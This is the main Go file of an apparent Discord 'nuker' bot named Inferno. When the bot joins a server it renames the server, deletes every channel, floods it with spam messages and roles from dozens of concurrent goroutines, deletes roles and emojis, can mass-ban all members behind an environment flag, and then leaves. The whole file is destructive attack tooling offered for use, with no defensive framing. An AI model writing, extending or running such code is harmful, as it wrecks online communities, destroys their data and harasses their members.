package main

import (
	"Inferno/core/creating"
	"Inferno/core/removing"
	"Inferno/core/requests"
	"Inferno/core/start_end"
	"fmt"
	"os"
	"strconv"
	"sync"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var (
	queue = make(chan string, 100)
	mutex = &sync.Mutex{}
)

func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
	var wg sync.WaitGroup

	queue <- event.ID
	requests.HandleQueue(s)

	godotenv.Load()
	MASS_BAN := os.Getenv("MASS_BAN")
	MASSBAN, _ := strconv.ParseBool(MASS_BAN)

	mutex.Lock()
	defer mutex.Unlock()

	start_end.Logs(s, event)
	creating.GuildRename(s, event)

	wg.Add(1)
	go func() {
		defer wg.Done()
		channels, _ := s.GuildChannels(event.ID)
		creating.DeleteChannels(s, channels)
	}()
	wg.Wait()

	start_end.InviteCreate(s, event)

	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			creating.TextSpam(s, event, &wg)
		}()
	}
	wg.Wait()

	wg.Add(1)
	go func() {
		defer wg.Done()
		creating.DeleteRoles(s, event)
	}()
	wg.Wait()

	for i := 0; i < 40; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			creating.RolesSpam(s, event)
		}()
	}
	wg.Wait()

	if MASSBAN {
		wg.Add(1)
		go func() {
			defer wg.Done()
			removing.MemberBan(s, event)
		}()
		wg.Wait()
	} else {
		fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
	}

	removing.EmojiDelete(s, event)

	start_end.Leave(s, event)
}
